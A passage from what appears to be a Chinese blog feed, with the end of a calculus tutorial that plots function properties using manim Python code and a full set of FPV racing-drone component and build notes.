class="line">            y_values = [<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">0</span>,  fill_opacity=<span class="number">1</span>, fill_color=PURPLE),</span><br><span class="line">            stroke_width = <span class="number">4</span>,</span><br><span class="line">        )<span class="comment">#小于0</span></span><br><span class="line">        x_graph5_2 = ax.plot_line_graph(</span><br><span class="line">            x_values = [<span class="number">3</span>],</span><br><span class="line">            y_values = [<span class="number">2</span>],</span><br><span class="line">            line_color=GOLD_E,</span><br><span class="line">            vertex_dot_style=<span class="built_in">dict</span>(stroke_width=<span class="number">2</span>,  fill_opacity=<span class="number">1</span>),</span><br><span class="line">            stroke_width = <span class="number">0</span>,</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph3,graph4,graph5,x_graph1_1,x_graph1_2,x_graph2_1,x_graph2_2,x_graph3_1,x_graph3_2,x_graph4_1,x_graph4_2,x_graph5_1,x_graph5_2)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/4.png" alt="output_10_0">  </p><h4 id="分段函数"><a href="#分段函数" class="headerlink" title="分段函数"></a>分段函数</h4><p>$\begin{align}<br>y &amp; = f(x) = \left{\begin{array}{ll}<br>2 \sqrt{x}, &amp; 0 \leqslant x \leqslant 1 \<br>1+x, &amp; x&gt;1<br>\end{array}\right.<br>\end{align}$</p><p>定义：在自变量的不同变化范围中，对应法则用不同的式子来表达的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#分段函数</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: x**<span class="number">2</span>+<span class="number">1</span>, x_range=[<span class="number">0</span>,<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x:  <span class="number">1</span>+x, x_range=[-<span class="number">1</span>,<span class="number">0</span>], use_smoothing=<span class="literal">False</span>,color=YELLOW)</span><br><span class="line">        graph3 = ax.plot(<span class="keyword">lambda</span> x:  -<span class="number">1</span>, x_range=[-<span class="number">2</span>,-<span class="number">1</span>], use_smoothing=<span class="literal">False</span>,color=BLUE)</span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, <span class="string">&quot;y=x^2+1&quot;</span>, x_val=<span class="number">1</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph2_label = ax.get_graph_label(</span><br><span class="line">            graph2, <span class="string">&quot;y=1+x&quot;</span>, x_val=-<span class="number">1</span>,direction=<span class="number">6</span>+LEFT*<span class="number">5</span>, color=GREEN</span><br><span class="line">        )</span><br><span class="line">        graph3_label = ax.get_graph_label(</span><br><span class="line">            graph3, <span class="string">&quot;y=-1&quot;</span>, x_val=-<span class="number">2</span>,direction=UR , color=GREEN</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph3,graph1_label,graph2_label,graph3_label)</span><br><span class="line"><span class="comment"># jupyter notebook 的魔法函数运行方式</span></span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/5.png" alt="output_12_0"></p><h3 id="函数的特性"><a href="#函数的特性" class="headerlink" title="函数的特性"></a>函数的特性</h3><h4 id="有界性"><a href="#有界性" class="headerlink" title="有界性"></a>有界性</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>存在实数$M&gt;0$，使得对于集$X$中的所有$x$，都有${\displaystyle |f(x)|\leq M}$。</p><p>如果对于集合$X$中的所有$x$，都有${\displaystyle f(x)\leq A}$，则函数$f$称为<strong>上有界的</strong>，$A$就是它的一个上界</p><p>如果对于集合$X$中的所有$x$，都有${\displaystyle f(x)\geq B}$，则函数$f$称为<strong>下有界的</strong>，$B$就是它的一个下界。</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><p>$\begin{align}<br>f(x) &amp; = \frac{1}{x^{2}-1}<br>\end{align}$</p><p>$x$不等于−1或1是无界的（等于的话就没有意义）。如果把函数的定义域限制为$[2,\infty)$，则函数就是有界的。</p><p>$\begin{align}<br>y &amp; = \sin x<br>\end{align}$在其定义域内有界</p><p>$\begin{align}<br>y &amp; = x^{2}<br>\end{align}$在其定义域内无界</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#有界性</span></span><br><span class="line"><span class="keyword">from</span> manim <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogScalingExample</span>(<span class="title class_ inherited__">Scene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">construct</span>(<span class="params">self</span>):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">            y_range=[-<span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">            tips=<span class="literal">False</span>,</span><br><span class="line">            axis_config=&#123;<span class="string">&quot;include_numbers&quot;</span>: <span class="literal">True</span>&#125;, <span class="comment">#是否将数字添加到刻度线。</span></span><br><span class="line">            <span class="comment">#y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, x_range=[-<span class="number">2</span>,<span class="number">2</span>], use_smoothing=<span class="literal">False</span>,color=RED)</span><br><span class="line">        graph2 = ax.plot(<span class="keyword">lambda</span> x: np.sin(x), x_range=[-<span class="number">1</span> * np.pi, <span class="number">1</span> * np.pi], use_smoothing=<span class="literal">False</span>,color=YELLOW)</span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, <span class="string">&quot;y=x^2&quot;</span>, x_val=<span class="number">2</span>,direction=UR , color=RED</span><br><span class="line">        )</span><br><span class="line">        graph2_label = ax.get_graph_label(</span><br><span class="line">            graph2, <span class="string">&quot;y=\sin x&quot;</span>, x_val=-<span class="number">2</span>,direction=LEFT*<span class="number">6</span>+<span class="number">5</span>, color=YELLOW</span><br><span class="line">        )</span><br><span class="line">        self.add(ax, graph1,graph2,graph1_label,graph2_label)</span><br><span class="line">%manim -v WARNING -qh  --<span class="built_in">format</span>=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/6.png" alt="2"></p><p>红线不具有有界性，黄线具有有界性</p><h4 id="单调性"><a href="#单调性" class="headerlink" title="单调性"></a>单调性</h4><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><p>若函数$x$值随着自变量的增大而增大，则函数是单调增加的</p><p>若函数$x$值随着自变量的增大而减小，则函数是单调减少的</p><h5 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h5><p>$\begin{align}<br>y &amp; =  x^2<br>\end{align}$</p><p>在$(-\infty,0)$单调递减，在$(0,\infty)$单调递增</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from manim import *</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">class LogScalingExample(Scene):</span><br><span class="line">    def construct(self):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-3, 3, 1],</span><br><span class="line">            y_range=[-5, 5, 1],</span><br><span class="line">            tips=False,</span><br><span class="line">            axis_config=&#123;&quot;include_numbers&quot;: True&#125;, #是否将数字添加到刻度线。</span><br><span class="line">            #y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(lambda x: x**2, x_range=[-2,2], use_smoothing=False,color=RED)</span><br><span class="line">        </span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, &quot;y=x^2&quot;, x_val=2,direction=UR , color=RED</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.add(ax, graph1,graph1_label)</span><br><span class="line"># jupyter notebook 的魔法函数运行方式</span><br><span class="line">%manim -v WARNING -qh  --format=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/7.png" alt="LogScalingExample@2022-12-13@13-35-21"></p><p>$\begin{align}<br>y &amp; =  x^3<br>\end{align}$</p><p>在整个数轴上单调递增</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from manim import *</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">class LogScalingExample(Scene):</span><br><span class="line">    def construct(self):</span><br><span class="line">        ax = Axes(</span><br><span class="line">            x_range=[-3, 3, 1],</span><br><span class="line">            y_range=[-6, 6, 1],</span><br><span class="line">            tips=False,</span><br><span class="line">            axis_config=&#123;&quot;include_numbers&quot;: True&#125;, #是否将数字添加到刻度线。</span><br><span class="line">            #y_axis_config=&#123;&quot;scaling&quot;: LogBase(custom_labels=True)&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        graph1 = ax.plot(lambda x: x**3, x_range=[-2,2], use_smoothing=False,color=RED)</span><br><span class="line">        </span><br><span class="line">        graph1_label = ax.get_graph_label(</span><br><span class="line">            graph1, &quot;y=x^3&quot;, x_val=2,direction=UR , color=RED</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.add(ax, graph1,graph1_label)</span><br><span class="line"># jupyter notebook 的魔法函数运行方式</span><br><span class="line">%manim -v WARNING -qh  --format=gif  -t LogScalingExample</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/8.png" alt="1"></p><p>$\begin{align}<br>y &amp; = x^{-1} = \frac{1}{x}<br>\end{align}$</p><p>在$(-\infty,0)$单调递减，在$(0,\infty)$也是单调递减</p><h4 id="奇偶性"><a href="#奇偶性" class="headerlink" title="奇偶性"></a>奇偶性</h4><h5 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h5><p>设$f(x)$为一实变数实值函数，则${\displaystyle f}$为<strong>偶函数</strong>若下列的方程对所有在${\displaystyle f}$的定义域内的${\displaystyle x}$都成立</p><p>$\begin{align}<br>f(x) &amp; = f(-x)<br>\end{align}$</p><p>设${\displaystyle f(x)}$为一个实变数实值函数，则${\displaystyle f}$为<strong>奇函数</strong>若下列的方程对所有在$f$的定义域内的${\displaystyle x}$都成立</p><p>$\begin{align} f(x) &amp; = -f(-x) \end{align}$  </p><p>$\begin{align}f(-x) &amp; = -f(x)\end{align}$</p><div class="note success modern"><p>总结：偶函数的图形关于$y$轴对称，奇函数的图形关于原点对称</p></div><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/9.png" alt="image-20221213140758006"></p><h5 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h5><p>$y=x^{2}$、$y=\cos x$ 都是偶函数</p><p>$y=x$ 、$y=x^{3}$ 、$y=\sin x$ 、$y=\tan x$ 、$y=\arctan x$都是奇函数</p><p>$y=e^{x}$  是非奇非偶的函数</p><h4 id="周期性"><a href="#周期性" class="headerlink" title="周期性"></a>周期性</h4><h5 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h5><p>对于实数或者整数函数来说，周期性意味着按照一定的间隔重复一个特定部分就可以绘制出完整的函数图。如果在函数${\displaystyle f}$中所有的位置${\displaystyle x}$都满足</p><p>$\begin{align}<br>f(x+T) &amp; = f(x)<br>\end{align}$</p><p>那么，${\displaystyle f}$就是周期为${\displaystyle T}$的周期函数。<strong>非周期函数</strong>就是没有类似周期${\displaystyle T}$的函数。</p><h5 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h5><p>常见的周期函数有${\displaystyle \sin x}$，${\displaystyle \cos x}$和${\displaystyle \tan x}$等</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/10.png" alt="img"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>FPV笔记</title>
    <link href="https://www.ascotbe.com/2022/10/24/FPV/"/>
    <id>https://www.ascotbe.com/2022/10/24/FPV/</id>
    <published>2022-10-24T13:01:07.000Z</published>
    <updated>2023-01-05T06:17:01.848Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>随便几张图的，一些选配笔记</p><h2 id="穿越机的分类"><a href="#穿越机的分类" class="headerlink" title="穿越机的分类"></a>穿越机的分类</h2><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/10.png" alt="categories"></p><h3 id="按尺寸分类"><a href="#按尺寸分类" class="headerlink" title="按尺寸分类"></a>按尺寸分类</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/11.png" alt="dimension"></p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/1.png" alt="curriculum" style="zoom: 33%;" /></p><h2 id="构成图"><a href="#构成图" class="headerlink" title="构成图"></a>构成图</h2><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/2.png" alt=""></p><h2 id="飞塔"><a href="#飞塔" class="headerlink" title="飞塔"></a>飞塔</h2><p>飞塔是由飞控和电调这两个部分组成的。其核心设备是飞控，全称为飞行控制器，顾名思义，飞控属于飞机的控制系统，你可以把它理解为飞机的大脑，控制着飞机的动力系统（电机、电调、电池、螺旋桨）和图像传输系统（摄像头、图传、接收设备）的正常运作。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/3.png" alt="飞控"></p><p>电调的话有分四合一电调和分体电调。四合一电调的话是合在一个板块上的，方便焊接。而分体电调是有多个（主要看你又几个桨叶），一个电调控制一个桨叶</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/4.png" alt="电调"></p><h3 id="两层塔、三层塔有什么区别？"><a href="#两层塔、三层塔有什么区别？" class="headerlink" title="两层塔、三层塔有什么区别？"></a>两层塔、三层塔有什么区别？</h3><p>对于新手来说，直接选择飞塔可能会是一个比较省事儿的操作。因为一般来说，同一个厂牌的产品会有比较好的适配性和稳定性，装机的过程也会更加容易。由于机架的类型、空间的区别，飞塔通常会有两层塔和三层塔两种选择。</p><p>两层塔一般指的是飞控和电调的组合，适用于机架空间较大的花飞机架；三层塔一般指的是飞控+电调+图传的组合，适用于机架空间比较紧凑的竞速机架。</p><h3 id="选多大尺寸的飞控？"><a href="#选多大尺寸的飞控？" class="headerlink" title="选多大尺寸的飞控？"></a>选多大尺寸的飞控？</h3><p>选购飞控的第一步，是确定你要玩什么尺寸的飞机，选定机架之后仔细阅读商品详情页，以GEPRC/格普GEP-MK5举例采用了主流的30.5mm x30.5mm的飞控孔位</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/12.png" alt="image-20221110111142507"></p><h3 id="F4和F7有什么区别？"><a href="#F4和F7有什么区别？" class="headerlink" title="F4和F7有什么区别？"></a>F4和F7有什么区别？</h3><p>穿越机飞控常用的f4,f7芯片，是飞塔的主控芯片，主要用来进行一些数值运算，相当于电脑上的CPU</p><p>这两者最直观的区别就是性能和价格：f7有更强的性能，处理速度从f4的168Mhz上升到了216Mhz，是f4的1.5倍，当然价格也更高</p><h3 id="焊盘设计是否符合装机规律？"><a href="#焊盘设计是否符合装机规律？" class="headerlink" title="焊盘设计是否符合装机规律？"></a>焊盘设计是否符合装机规律？</h3><p>摄像头（CAM）的焊点在前，方便向前走线；接收机（REC）、图传（VTX）和LED灯的焊点在后，方便向后走线；左右两侧则是一些拓展焊点，如bb响、gps等，满足其他个性化的需求</p><h3 id="电调选多少A的合适？"><a href="#电调选多少A的合适？" class="headerlink" title="电调选多少A的合适？"></a>电调选多少A的合适？</h3><p>选择电调时，可以参阅电机的参数表，按照使用的电池电压和螺旋桨，选择相近的测试数据，查询相应的电流数据。</p><p>比如说我们现在装5寸的飞机，选用了TMOTOR黑鸟2207 V2.0的型号电机KV2800的话。如果使用T4943的三叶桨，我们的电调的话就得选用38.48A以上的电调。最好是高出1.5倍，不然会导致机器烧毁。淘宝上客服说35A的电调也可以用，那是你油门不拉倒百分百的情况下，只要你拉上百分百必定烧毁，奸商真恶心。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/13.png" alt="img"></p><p>推荐的厂家：格普、翼飞、飞盈佳乐、好盈</p><p>不推荐厂家：化骨龙</p><h2 id="电机"><a href="#电机" class="headerlink" title="电机"></a>电机</h2><h3 id="空心杯电机VS无刷电机"><a href="#空心杯电机VS无刷电机" class="headerlink" title="空心杯电机VS无刷电机"></a>空心杯电机VS无刷电机</h3><h4 id="空心杯电机"><a href="#空心杯电机" class="headerlink" title="空心杯电机"></a>空心杯电机</h4><p>空心杯电机属于直流电机，仅仅需要两根导线就能驱动，电机的电流越大则转速越快，<strong>无法精确控制速度</strong>，<strong>且只能朝一个方向旋转</strong>。控制空心杯电机只需要一个大电流的驱动芯片即可。</p><p>因为空心杯电机在旋转过程中需要持续倒置电极，所以转子（Rotor）和导线（Coil）之间通过电刷轻触连接。<strong>长时间的工作会对电刷造成磨损</strong>。</p><p>一台空心杯电机的无人机动力相对较弱，<strong>加速减速的能力较弱</strong>。而且各个电机不同程度的磨损容易导致速度不同步。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/14.gif" alt="brushed_motor"></p><h4 id="无刷电机"><a href="#无刷电机" class="headerlink" title="无刷电机"></a>无刷电机</h4><p>和空心杯电机不同，无刷电机的转子（Rotor）与定子（Stator）无接触，通常需要三根导线来驱动。无刷电靠电调的控制芯片产生生成轮替的电流，使定子上的导线依次产生磁力来牵引定子。所以<strong>无刷电机的机械损耗极低</strong>，<strong>且能双向旋转</strong>。</p><p>电调的存在能够让电机精确地控制速度。无刷电机除了有更高的绝对速度，也有<strong>更好的加速能力和减速能力</strong>，非常适合让穿越机在过弯时瞬间产生极高的电机速度差。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/15.gif" alt="brushless_motor"></p><h3 id="根据你的需求和机架，挑选适配的电机"><a href="#根据你的需求和机架，挑选适配的电机" class="headerlink" title="根据你的需求和机架，挑选适配的电机"></a>根据你的需求和机架，挑选适配的电机</h3><p>一般来说，现在市场上很多机架都会提供适配机架的电机型号，新手最好根据商家的推荐来选择相应的电机型号。</p><p>如果没有推荐的型号，就需要根据机架的电机座安装孔位来选择合适的电机，即——机臂和电机座的安装孔位必须一致，避免电机装不进机臂的情况出现。</p><p>举个栗子，你可能自行购买了商家标注3寸的机架和电机，到手却发现无法匹配，可能就是因为购买时忽略了机臂与电机座安装孔位的差异。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/16.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/17.png" alt="img"></p><p>然后我们看机架，支持16或者19的孔位</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/18.png" alt="image-20221110133053520"></p><h3 id="电机型号的数字是什么意思？怎么选？"><a href="#电机型号的数字是什么意思？怎么选？" class="headerlink" title="电机型号的数字是什么意思？怎么选？"></a>电机型号的数字是什么意思？怎么选？</h3><p>比较适合2-3寸机的1103/1106/1507等电机</p><p>比较适合5-7寸机的2206/2207/2306/2807等电机。</p><p>那么，这些数字是什么意思?</p><p>首先你需要知道电机有两个组成部分——定子和转子。</p><p>定子是缠绕铜丝的里面部分，转子是通过电磁炉旋转的轴承</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/19.png" alt="img" style="zoom:25%;" /></p><p>电机型号的前两位数字如11/22/23等系列的意思是电机定子的直径参数，而后两位数字如03/06/07等是定子高度的参数。定子的外径和高度越多，定子的铁芯越大，线圈绕的匝数也越多，表现出来就是电机的功率越大。当然，尺寸越大功率越大，但重量也越大。</p><h3 id="多大的kv值适合我？"><a href="#多大的kv值适合我？" class="headerlink" title="多大的kv值适合我？"></a>多大的kv值适合我？</h3><p>通常电机会有各种kv值让你选择，kv值的含义可以简单理解为——电压每增加1伏，电机的每分钟转速就增加多少。</p><p>如果有钱就买：黑鸟</p><p>没钱就买：dys</p><h2 id="机架"><a href="#机架" class="headerlink" title="机架"></a>机架</h2><p>机架的价格从几十到几百上千，不同的品牌、设计工艺和材质等因素，会造成机架价格的差异。一般来说，贵总是有贵的道理，但俗话说的好：<strong>有多少钱，就办多大事。</strong>毕竟机架不像眼镜和遥控，如果技术不到位，机架就是个消耗品。</p><p><strong>耐炸程度一般由两个方面决定。</strong></p><p>其一是机架的设计，包括几何设计和力学分析，需要一定的专业经验来判断，对普通消费者来说，关注一些圈内的技术大佬，然后看口碑即可。</p><p>其二是碳板的品质，最简单的方法就是看商家标示的碳纤维标号，如t300、t700，标号越高，碳板质量越好。</p><h2 id="桨叶"><a href="#桨叶" class="headerlink" title="桨叶"></a>桨叶</h2><h3 id="螺旋桨的参数是什么意思？"><a href="#螺旋桨的参数是什么意思？" class="headerlink" title="螺旋桨的参数是什么意思？"></a>螺旋桨的参数是什么意思？</h3><p>通常厂家会有两种标法，以51466-3和5.1X4.66X3为例。这两种标法的表达方式不同，但含义是相同的。前两位数字是螺旋桨的尺寸，如51就是5.1英寸；后面的数字表示的含义是螺距，简单来说，螺距就是螺旋桨旋转一圈前进的距离，如466即为4.66英寸的螺距；最后一位数字的含义是螺旋桨的叶数，如3就是3叶的螺旋桨。</p><h3 id="不同大小的螺距，有什么使用差异"><a href="#不同大小的螺距，有什么使用差异" class="headerlink" title="不同大小的螺距，有什么使用差异?"></a>不同大小的螺距，有什么使用差异?</h3><p>螺距大小影响拉力大小和手感，通常螺距越大，拉力也就越大。但螺距也不是越大越好的，大螺距的桨带给电机的负载也大，而小螺距的桨有响应更加快速、更加线性的优势。所以竞速飞机一般偏向于选择大螺距的桨，速度更快更暴力，而花飞通常喜欢使用较小螺距的桨，以获得更加顺滑的飞行和更快的动作响应</p><h3 id="好桨-好电机≠好动力，要看配合"><a href="#好桨-好电机≠好动力，要看配合" class="headerlink" title="好桨+好电机≠好动力，要看配合"></a>好桨+好电机≠好动力，要看配合</h3><p>大部分电机厂商会给出力效表，而看力效表的第一步就是找到相配的桨叶，不同的电机和螺旋桨的组合，产生的效果不同。</p><h3 id="桨叶方向"><a href="#桨叶方向" class="headerlink" title="桨叶方向"></a>桨叶方向</h3><p>一袋螺旋桨包括两正两反的4只螺旋桨，当你完成整机的安装，并且调参完毕后，就可以拿出你的螺旋桨进行起飞前的安装了。<strong>安装螺旋桨需要学会判断桨叶的朝向。</strong>如1、4号电机安装顺时针旋转的螺旋桨，桨叶的迎角向前（即上扬的一侧）；2、3号电机安装逆时针旋转的螺旋桨，桨叶的迎角向后</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/20.png" alt="img"></p><h2 id="遥控"><a href="#遥控" class="headerlink" title="遥控"></a>遥控</h2><ul><li><p>Futaba（t18sz/mz、t16sz/mz/iz、14sz/mz） </p></li><li><p>地平线（ix12、dx9、dx8）</p></li><li>黑羊TBS（Tango 2、Mambo）</li><li>福斯（i6、PL18）</li><li>乐迪（AT10、AT9S、AT9）</li><li>天地飞（et16、et12、et07）</li><li>Frsky（X9D）</li></ul><p>通道：指你可以通过遥控控制功能的多少（越多越好）充足的通道数有助于给控制飞机留有更多的余地，例如控制不同的功能，如解锁、切换模式等。</p><p>系统：分为闭源和开源。闭源系统一般是厂商适配自己遥控器的，比如天地飞、futaba、富斯等的操作系统。开源系统主要流行opentx及其衍生版本，如edgetx。一般推荐使用opentx及其衍生版本，因为在圈子里使用人数较高，容易得到技术支持；再者，opentx可以快速方便的获取更新，扩展性也非常强，后期升级遥控很方便；最后一点，opentx的内置功能非常丰富与强大，可以添加各种功能插件，如lua脚本，实现很多的功能。而这些功能如果放到闭源系统上，价格可能远高于opentx系统的遥控（举个例子，电压回传）。</p><p>高频头：遥控器可以加装高频头，高频头可以大大提升遥控的距离、减小延迟、增加稳定性等等。遥控器一般后部会有一个插槽，即JR仓，可以将内置的高频头卸下更换更加高级的外置高频头；</p><h3 id="两个摇杆如何控制无人机？"><a href="#两个摇杆如何控制无人机？" class="headerlink" title="两个摇杆如何控制无人机？"></a>两个摇杆如何控制无人机？</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/21.gif" alt="yaw_pitch_roll"></p><p>穿越机的油门与姿态控制是非常重要的控制概念，其中<strong>throttle，pitch，yaw，roll在入坑后会频繁出现，需要着重记忆</strong>。</p><ul><li>左侧摇杆</li></ul><div class="table-container"><table><thead><tr><th>油门（Throttle）</th><th>偏航（Yaw）</th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/22.gif" alt="throttle"></td><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/25.gif" alt="yaw"></td></tr><tr><td>增大所有旋翼转速</td><td>左右转向</td></tr></tbody></table></div><ul><li>右侧摇杆</li></ul><div class="table-container"><table><thead><tr><th>俯仰（Pitch）</th><th>翻滚 （Roll）</th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/23.gif" alt="pitch"></td><td><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/24.gif" alt="roll"></td></tr><tr><td>前后摇摆</td><td>左右摇摆</td></tr></tbody></table></div><h2 id="电池"><a href="#电池" class="headerlink" title="电池"></a>电池</h2><p>1S-6S意思是电池片数，这个数字越高，则标称电压越高。室内机用的都是1S的电池，充电方便，体积重量也小。一个电芯电压只有3.7V，所以驱动能力比较差。</p><h2 id="装机"><a href="#装机" class="headerlink" title="装机"></a>装机</h2><p>将元件分类平摊在桌面上，细小的零件放在收纳盒中，导线和电子元件需要和尖锐物体分开放置。</p><h3 id="元件类"><a href="#元件类" class="headerlink" title="元件类"></a>元件类</h3><ul><li>必备：机架，电机，桨叶，飞塔（飞控与电调），摄像头，图传模组，图传发射天线，遥控信号接收机，接收天线</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/5.png" alt="components"></p><ul><li>可选：LED灯带，GPS模块，蜂鸣器</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/6.png" alt="components__optional"></p><h3 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h3><ul><li>焊接类：电烙铁，焊锡丝，万向夹，热风枪，万用表</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/7.png" alt="soldering_tools"></p><ul><li>五金类：M2与M3六角螺丝刀，M3，M5内六角套筒，剥线钳，剪刀，镊子</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/8.png" alt="tools"></p><h3 id="耗材类"><a href="#耗材类" class="headerlink" title="耗材类"></a>耗材类</h3><ul><li>硅胶导线，热缩管，M3内六角螺丝螺母，M5内六角螺母，M3通孔铝柱，绝缘胶带（推荐醋酸胶带），尼龙扎带</li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FPV/9.png" alt="consumable"></p><h2 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h2><ul><li>TBS</li><li><p>FPV AIR2</p></li><li><p>Liftoff </p></li><li><p>Uncrashed</p></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="无人机" scheme="https://www.ascotbe.com/categories/%E6%97%A0%E4%BA%BA%E6%9C%BA/"/>
    
    <category term="配件介绍" scheme="https://www.ascotbe.com/categories/%E6%97%A0%E4%BA%BA%E6%9C%BA/%E9%85%8D%E4%BB%B6%E4%BB%8B%E7%BB%8D/"/>
    
    
